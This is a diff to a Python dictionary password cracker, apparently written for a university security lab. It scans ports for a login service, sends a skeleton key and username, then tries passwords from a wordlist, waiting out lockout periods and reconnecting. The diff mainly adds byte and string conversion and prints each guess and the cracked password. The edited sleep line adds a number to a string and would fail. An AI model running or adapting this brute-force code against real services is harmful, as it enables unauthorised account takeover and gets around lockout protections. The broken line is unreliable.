@@ -23,9 +23,15 @@ def parse():
      parser.add_argument('--dict',default='dictionary.txt',type=str,help="DICT",dest='dict')
      return parser.parse_args()
 
+def to_bytes(msg):
+     return bytes(msg, 'utf-8')
+
+def to_str(byte_msg):
+     return byte_msg.decode('utf-8')
+
 def create_dict():
      passwords = []
-     fp = open("dictionary.txt", "r")
+     fp = open(DICTIONARY, "r")
      for _, line in enumerate(fp):
           passwords.append(line.replace('\n',''))
      return passwords
@@ -117,37 +123,37 @@ def crack_password():
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((HOST, PORT))
      # print("Sending skeletonkey...")
-     s.sendall(SKELETONKEY)
+     s.sendall(to_bytes(SKELETONKEY))
      data = s.recv(BYTES)
      # print("Data received: %s" % data)
      # print("Sending username...")
-     s.sendall(CRUZID)
+     s.sendall(to_bytes(CRUZID + '\n'))
      data = s.recv(BYTES)
      # print("Received: %s" % data)
      i = -1
      while True:
-          if data == 'Password: ':
+          if to_str(data) == 'Password: ':
                i += 1
-               # print("\tSending password %s..." % passwords[i])
-               s.sendall(passwords[i])
+               print("\tSending password %s..." % passwords[i])
+               s.sendall(to_bytes(passwords[i]))
                data = s.recv(BYTES)
                # print("Received: %s" % data)
-               if data == 'Incorrect password, goodbye.\n':
+               if to_str(data) == 'Incorrect password, goodbye.\n':
                     # print("\tThe password %s was incorrect. :C" % passwords[i])
                     s.close()
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     # print("\tReconnecting to %s over port %d..." % (HOST, PORT))
                     s.connect((HOST, PORT))
                     # print("Sending skeletonkey...")
-                    s.sendall(SKELETONKEY)
+                    s.sendall(to_bytes(SKELETONKEY))
                     data = s.recv(BYTES)
                     # print("Data received: %s" % data)
                     # print("\tSending username...")
-                    s.sendall(CRUZID)
+                    s.sendall(to_bytes(CRUZID + '\n'))
                     data = s.recv(BYTES)
                     # print("Received: %s" % data)
                else:
-                    # print("Password cracked! Password is %s" % passwords[i])
+                    print("Password cracked! Password is %s" % passwords[i])
                     password = passwords[i]
                     s.close()
                     # pass to next function
@@ -156,16 +162,16 @@ def crack_password():
                # print("\tOut of tries!")
                # print("\t\tSleep for %d seconds at %s" % (602, str(datetime.datetime.now())))
                s.close()
-               time.sleep(get_blackout_period_from(data) + 2)
+               time.sleep(get_blackout_period_from(to_str(data) + 2))
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # print("\t\tReconnecting to %s over port %d..." % (HOST, PORT))
                s.connect((HOST, PORT))
                # print("Sending skeletonkey...")
-               s.sendall(SKELETONKEY)
+               s.sendall(to_bytes(SKELETONKEY))
                data = s.recv(BYTES)
                # print("Data received: %s" % data)
                # print("\t\tSending username...")
-               s.sendall(CRUZID)
+               s.sendall(to_bytes(CRUZID + '\n'))
                data = s.recv(BYTES)
 
 def scan_ports():
@@ -174,7 +180,8 @@ def scan_ports():
      for _, line in enumerate(fp):
           port = re.findall("[0-9]{5}", line)
           PORT = int(port[0])
-          if PORT == 10243:
+          # skip for now cuz its timing out
+          if PORT == 10243 or PORT == 10151:
                continue
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           print("connecting to PORT %d" % PORT)
@@ -182,12 +189,14 @@ def scan_ports():
           s.sendall(bytes(SKELETONKEY, 'utf-8'))
           data = s.recv(BYTES)
           s.sendall(bytes(CRUZID + '\n', 'utf-8'))
+          s.settimeout(5)
           data = s.recv(BYTES)
           s.close()
           print("data received",data)
           if data.decode('utf-8') == 'Password: ':
                print('Received %s from port %d' % (data.decode('utf-8'), PORT))
                crack_password()
+               break
 
 def main():
      global HOST
